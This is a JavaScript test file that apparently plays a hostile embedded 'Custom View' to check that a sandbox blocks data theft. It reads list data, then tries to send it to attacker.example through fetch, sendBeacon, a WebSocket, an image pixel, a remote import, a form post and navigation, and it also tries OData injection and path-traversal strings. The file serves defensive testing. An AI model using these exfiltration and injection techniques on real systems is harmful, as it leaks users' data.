// A hostile Custom View. Same privileges as any other: no token, no
// network, no origin. It reads real data first, then tries every way out
// with it. The threat runs author -> viewer: a view only sees what the
// person viewing it could already read, so what matters is getting that
// data back OUT.

const probes = document.getElementById("probes");
const summary = document.getElementById("summary");

const rows = (await skye.list("Events", { select: ["Title", "Start"], top: 4 }).catch(() => ({ items: [] }))).items;
const LOOT = "https://attacker.example/?stolen=" + encodeURIComponent(JSON.stringify(rows));
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

let blocked = 0;
let total = 0;

// Trust the browser's own violation event, not a return value.
let violated = false;
addEventListener("securitypolicyviolation", () => {
  violated = true;
});

const probe = async (label, fn) => {
  skye.report(label); // in case we don't survive this one
  violated = false;
  let got;
  let err;
  try {
    got = await fn();
  } catch (e) {
    err = e;
  }
  await sleep(50); // give a violation event time to land

  const ok = violated || err !== undefined || got === undefined;
  const verdict = ok
    ? violated
      ? "BLOCKED (CSP)"
      : `BLOCKED${err ? ` (${err.name})` : ""}`
    : `LEAKED -> ${String(got).slice(0, 80)}`;
  total++;
  if (ok) blocked++;

  skye.report(label, verdict, ok);
  probes.insertAdjacentHTML("beforeend", `<tr class="${ok ? "ok" : "bad"}"><td>${label}</td><td>${verdict}</td></tr>`);
};

const group = (title) => probes.insertAdjacentHTML("beforeend", `<tr class="grp"><td colspan="2">${title}</td></tr>`);

group("Reach into the host");
await probe("read the host's DOM", () => parent.document.title);
await probe("read a token from host localStorage", () => localStorage.getItem("msal.token") ?? localStorage.length);
await probe("read the host's cookies", () => document.cookie || undefined);
await probe("find out what page I'm embedded in", () => parent.location.href);
await probe("reach the host through window.top", () => top.document.body.innerHTML);

group("Send the data out over the network");
await probe("fetch()", () => fetch(LOOT).then(() => "response"));
await probe("navigator.sendBeacon()", () => navigator.sendBeacon(LOOT) || undefined);
await probe(
  "WebSocket",
  () =>
    new Promise((res) => {
      let ws;
      try {
        ws = new WebSocket("wss://attacker.example");
      } catch {
        return res(undefined);
      }
      ws.onopen = () => res("open");
      ws.onerror = ws.onclose = () => res(undefined);
      setTimeout(() => res(undefined), 1200);
    })
);
await probe(
  "tracking pixel",
  () =>
    new Promise((res) => {
      const img = new Image();
      img.onload = () => res("loaded");
      img.onerror = () => res(undefined);
      img.src = LOOT;
    })
);
await probe("register a service worker", () => navigator.serviceWorker.register("/sw.js").then(() => "registered"));
await probe("dynamic import() a remote module", () => import("https://attacker.example/x.js").then(() => "imported"));

group("Abuse the API I do have");
await probe("read a list not on the allowlist", () => skye.list("SecretHRList"));
await probe("pass a Graph path instead of a list name", () => skye.list("/me/messages"));
await probe("pass a raw OData filter string", () => skye.list("Events", { filter: "1 eq 1" }));
await probe("smuggle OData through an operator", () =>
  skye.list("Events", { where: { field: "Title", operator: "eq' or '1'='1", value: "z" } })
);
await probe("smuggle OData through a field name", () =>
  skye.list("Events", { where: { field: "Title eq 'x' or Title ne 'x", operator: "equals", value: "z" } })
);
await probe("path-traverse through image()", () => skye.image("Events", "1", "../../../me/drive/root"));
await probe("query an unknown field", () => skye.list("Events", { where: { field: "Ssn", operator: "equals", value: "1" } }));
await probe("skye.navigate() to a non-allowlisted external URL", () => skye.navigate({ url: LOOT }));
await probe("skye.navigate() with a javascript: URL", () => skye.navigate({ url: "javascript:alert(1)" }));

// Everything reported so far; the navigation probes below may tear this
// frame down, so publish a summary now and let the host's console be the
// source of truth for the last group.
summary.textContent = `${blocked} / ${total} blocked`;
summary.className = blocked === total ? "ok" : "bad";

group("Send the data out by navigating");
await probe("open a popup", () => (open(LOOT) ? "popup" : undefined));
await probe("submit a form", () => {
  const f = document.createElement("form");
  f.action = LOOT;
  f.method = "POST";
  document.body.append(f);
  f.submit();
  return sleep(300);
});
await probe("navigate the top page", () => {
  top.location = LOOT;
  return sleep(300);
});
await probe("navigate myself", () => {
  location.href = LOOT;
  return sleep(300);
});

summary.textContent = `${blocked} / ${total} blocked`;
summary.className = blocked === total ? "ok" : "bad";
